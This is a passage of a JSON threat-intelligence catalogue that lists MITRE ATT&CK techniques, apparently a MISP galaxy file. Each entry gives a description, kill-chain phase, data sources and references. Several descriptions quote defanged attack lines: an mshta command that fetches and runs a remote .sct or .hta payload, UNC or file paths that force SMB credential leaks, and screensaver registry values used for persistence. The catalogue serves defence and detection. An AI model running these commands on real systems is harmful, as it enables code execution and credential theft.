          "https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx"
        ]
      },
      "uuid": "c1a452f3-6499-4c12-b7e9-a6a0a102af76",
      "value": "Process Doppelgänging - T1186"
    },
    {
      "description": "The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)\n\nAdversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.",
      "meta": {
        "external_id": "T1177",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "DLL monitoring",
          "File monitoring",
          "Kernel drivers",
          "Loaded DLLs",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1177",
          "https://technet.microsoft.com/library/cc961760.aspx",
          "https://technet.microsoft.com/library/dn408187.aspx",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902",
          "https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx"
        ]
      },
      "uuid": "6e6845c2-347a-4a6f-a2d1-b74a18ebd352",
      "value": "LSASS Driver - T1177"
    },
    {
      "description": "The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information including the user's hashed credentials over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
      "meta": {
        "external_id": "T1187",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Network protocol analysis",
          "Network device logs",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1187",
          "https://en.wikipedia.org/wiki/Server_Message_Block",
          "https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/",
          "https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx",
          "https://github.com/hob0/hashjacking",
          "https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf",
          "https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/",
          "https://www.us-cert.gov/ncas/alerts/TA17-293A"
        ]
      },
      "uuid": "b77cf5f3-6060-475d-bd60-40ccbf28fdc2",
      "value": "Forced Authentication - T1187"
    },
    {
      "description": "Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)",
      "meta": {
        "external_id": "T1197",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Packet capture",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1197",
          "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx",
          "https://msdn.microsoft.com/library/aa362813.aspx",
          "https://www.secureworks.com/blog/malware-lingers-with-bits",
          "https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/",
          "https://www.symantec.com/connect/blogs/malware-update-windows-update",
          "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/",
          "https://technet.microsoft.com/library/dd939934.aspx"
        ]
      },
      "uuid": "c8e87b83-edbb-48d4-9295-4974897525b7",
      "value": "BITS Jobs - T1197"
    },
    {
      "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.",
      "meta": {
        "external_id": "T1199",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Stackdriver logs",
          "AWS CloudTrail logs",
          "Application logs",
          "Authentication logs",
          "Third-party application logs"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS",
          "AWS",
          "GCP",
          "Azure",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1199"
        ]
      },
      "uuid": "9fa07bef-9c81-421e-a8e5-ad4366c5a925",
      "value": "Trusted Relationship - T1199"
    },
    {
      "description": "The use of credentials by an adversary with the intent to hide their true identity and/or portray them self as another person or entity.  An adversary may use misattributable credentials in an attack to convince a victim that credentials are legitimate and trustworthy when this is not actually the case. (Citation: FakeSSLCerts)",
      "meta": {
        "external_id": "T1322",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1322"
        ]
      },
      "uuid": "31fa5b03-1ede-4fab-8a68-ed831fcf4899",
      "value": "Misattributable credentials - T1322"
    },
    {
      "description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file formats that can encrypt files are RAR and zip.",
      "meta": {
        "external_id": "T1532",
        "kill_chain": [
          "mitre-mobile-attack:exfiltration"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1532"
        ]
      },
      "uuid": "e3b936a4-6321-4172-9114-038a866362ec",
      "value": "Data Encrypted - T1532"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nDNS (cache) poisoning is the corruption of an Internet server's domain name system table by replacing an Internet address with that of another, rogue address. When a Web user seeks the page with that address, the request is redirected by the rogue entry in the table to a different address. (Citation: Google DNS Poisoning) (Citation: DNS Poisoning China) (Citation: Mexico Modem DNS Poison)",
      "meta": {
        "external_id": "T1382",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1382"
        ]
      },
      "uuid": "76c9e8cb-52e1-4ddc-80d4-5f7231842e06",
      "value": "DNS poisoning - T1382"
    },
    {
      "description": "On Android versions prior to 5, applications can observe information about other processes that are running through methods in the ActivityManager class. On Android versions prior to 7, applications can obtain this information by executing the <code>ps</code> command, or by examining the <code>/proc</code> directory. Starting in Android version 7, use of the Linux kernel's <code>hidepid</code> feature prevents applications (without escalated privileges) from accessing this information (Citation: Android-SELinuxChanges).",
      "meta": {
        "external_id": "T1424",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1424",
          "https://code.google.com/p/android/issues/detail?id=205565"
        ]
      },
      "uuid": "1b51f5bc-b97a-498a-8dbd-bc6b1901bf19",
      "value": "Process Discovery - T1424"
    },
    {
      "description": "Adversaries may capture audio to collect information on a user of a mobile device using standard operating system APIs. Adversaries may target audio information such as user conversations, surroundings, phone calls, or other sensitive information.\n\nAndroid and iOS, by default, requires that an application request access to microphone devices from the user. In Android, applications must hold the <code>android.permission.RECORD_AUDIO</code> permission to access the microphone and the <code>android.permission.CAPTURE_AUDIO_OUTPUT</code> permission to access audio output such as speakers. Android does not allow third-party applications to hold <code>android.permission.CAPTURE_AUDIO_OUTPUT</code>, so audio output can only be obtained by privileged applications (distributed by Google or the device vendor) or after a successful privilege escalation attack. In iOS, applications must include the `NSMicrophoneUsageDescription` key in their `Info.plist` file.",
      "meta": {
        "external_id": "APP-19",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1429",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-19.html"
        ]
      },
      "uuid": "6683aa0c-d98a-4f5b-ac57-ca7e9934a760",
      "value": "Capture Audio - T1429"
    },
    {
      "description": "Dumpster diving is looking through waste for information on technology, people, and/or organizational items of interest. (Citation: FriedDumpsters)",
      "meta": {
        "external_id": "T1286",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1286"
        ]
      },
      "uuid": "6c79d654-6506-4f33-b48f-c80babdcc52d",
      "value": "Dumpster dive - T1286"
    },
    {
      "description": "Dynamic DNS is a automated method to rapidly update the domain name system mapping of hostnames to IPs. (Citation: FireEyeSupplyChain)",
      "meta": {
        "external_id": "T1333",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1333"
        ]
      },
      "related": [
        {
          "dest-uuid": "20a66013-8dab-4ca3-a67d-766c842c561c",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "54eb2bab-125f-4d1c-b999-0c692860bafe",
      "value": "Dynamic DNS - T1333"
    },
    {
      "description": "Redirecting a communication request from one address and port number combination to another. May be set up to obfuscate the final location of communications that will occur in later stages of an attack. (Citation: SecureWorks HTRAN Analysis)",
      "meta": {
        "external_id": "T1363",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1363"
        ]
      },
      "uuid": "13ff5307-b650-405a-9664-d8076930b2bf",
      "value": "Port redirector - T1363"
    },
    {
      "description": "Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\n\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) or [Spearphishing Link](https://attack.mitre.org/techniques/T1192) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)",
      "meta": {
        "external_id": "T1534",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "SSL/TLS inspection",
          "DNS records",
          "Anti-virus",
          "Web proxy",
          "File monitoring",
          "Mail server",
          "Office 365 trace logs"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux",
          "Office 365",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1534",
          "https://blog.trendmicro.com/phishing-starts-inside/",
          " https://labs.ft.com/2013/05/a-sobering-day/?mhq5j=e6 "
        ]
      },
      "uuid": "9e7452df-5144-4b6e-b04a-b66dd4016747",
      "value": "Internal Spearphishing - T1534"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nCredential pharming a  form of attack designed to steal users' credential by redirecting users to fraudulent websites. Pharming can be conducted either by changing the hosts file on a victim's computer or by exploitation of a vulnerability in DNS server software. (Citation: DriveByPharming) (Citation: GoogleDrive Phishing)",
      "meta": {
        "external_id": "T1374",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1374"
        ]
      },
      "uuid": "38a6d2f5-d948-4235-bb91-bb01604448b4",
      "value": "Credential pharming - T1374"
    },
    {
      "description": "An adversary may seek to lock the legitimate user out of the device, for example to inhibit user interaction or to obtain a ransom payment.\n\nOn Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode to prevent the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device’s passcode.(Citation: Android resetPassword)\n\nOn iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode, they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.(Citation: Xiao-KeyRaider)",
      "meta": {
        "external_id": "APP-28",
        "kill_chain": [
          "mitre-mobile-attack:impact",
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1446",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-28.html",
          "https://developer.android.com/reference/android/app/admin/DevicePolicyManager.html#resetPassword(java.lang.String,%20int)",
          "http://researchcenter.paloaltonetworks.com/2015/08/keyraider-ios-malware-steals-over-225000-apple-accounts-to-create-free-app-utopia/"
        ]
      },
      "uuid": "9d7c32f4-ab39-49dc-8055-8106bc2294a1",
      "value": "Device Lockout - T1446"
    },
    {
      "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)",
      "meta": {
        "external_id": "T1485",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1485",
          "https://www.symantec.com/connect/blogs/shamoon-attacks",
          "https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html",
          "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
          "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
          "https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/",
          "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html"
        ]
      },
      "uuid": "d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
      "value": "Data Destruction - T1485"
    },
    {
      "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",
      "meta": {
        "external_id": "T1495",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "BIOS",
          "Component firmware"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1495",
          "https://www.symantec.com/security-center/writeup/2000-122010-2655-99",
          "http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research"
        ]
      },
      "uuid": "f5bb433e-bdf6-4781-84bc-35e97e43be89",
      "value": "Firmware Corruption - T1495"
    },
    {
      "description": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.",
      "meta": {
        "external_id": "T1496",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Stackdriver logs",
          "AWS CloudTrail logs",
          "Process use of network",
          "Process monitoring",
          "Network protocol analysis",
          "Network device logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1496",
          "https://securelist.com/lazarus-under-the-hood/77908/",
          "https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc"
        ]
      },
      "uuid": "cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
      "value": "Resource Hijacking - T1496"
    },
    {
      "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
      "meta": {
        "external_id": "T1489",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Process monitoring",
          "Windows Registry",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1489",
          "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
          "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
          "https://www.secureworks.com/research/wcry-ransomware-analysis"
        ]
      },
      "uuid": "20fb2507-d71c-455d-9b6d-6104461cf26b",
      "value": "Service Stop - T1489"
    },
    {
      "description": "During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.\n\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).",
      "meta": {
        "external_id": "T1163",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1163",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf"
        ]
      },
      "uuid": "18d4ab39-12ed-4a16-9fdb-ae311bba4a0f",
      "value": "Rc.common - T1163"
    },
    {
      "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nAdversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",
      "meta": {
        "external_id": "T1121",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1121",
          "https://msdn.microsoft.com/en-us/library/04za0hca.aspx",
          "https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx",
          "https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/",
          "https://lolbas-project.github.io/lolbas/Binaries/Regasm/"
        ]
      },
      "uuid": "215190a9-9f02-4e83-bb5f-e0589965a302",
      "value": "Regsvcs/Regasm - T1121"
    },
    {
      "description": "Rootkits are programs that hide the existence of malware by intercepting (i.e., [Hooking](https://attack.mitre.org/techniques/T1179)) and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a [Hypervisor](https://attack.mitre.org/techniques/T1062), Master Boot Record, or the [System Firmware](https://attack.mitre.org/techniques/T1019). (Citation: Wikipedia Rootkit)\n\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
      "meta": {
        "external_id": "CAPEC-552",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "BIOS",
          "MBR",
          "System calls"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1014",
          "https://capec.mitre.org/data/definitions/552.html",
          "https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf",
          "https://en.wikipedia.org/wiki/Rootkit",
          "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
          "http://www.blackhat.com/docs/asia-14/materials/Tsai/WP-Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf"
        ]
      },
      "uuid": "0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
      "value": "Rootkit - T1014"
    },
    {
      "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
      "meta": {
        "external_id": "T1170",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1170",
          "https://en.wikipedia.org/wiki/HTML_Application",
          "https://msdn.microsoft.com/library/ms536471.aspx",
          "https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf",
          "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/",
          "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
          "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/",
          "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
          "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
        ]
      },
      "uuid": "a127c32c-cbb0-4f9d-be07-881a792408ec",
      "value": "Mshta - T1170"
    },
    {
      "description": "Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. \n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)",
      "meta": {
        "external_id": "T1180",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Windows Registry",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1180",
          "https://en.wikipedia.org/wiki/Screensaver",
          "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf"
        ]
      },
      "uuid": "2892b9ee-ca9f-4723-b332-0dc6e843a8ae",
      "value": "Screensaver - T1180"
    },
    {
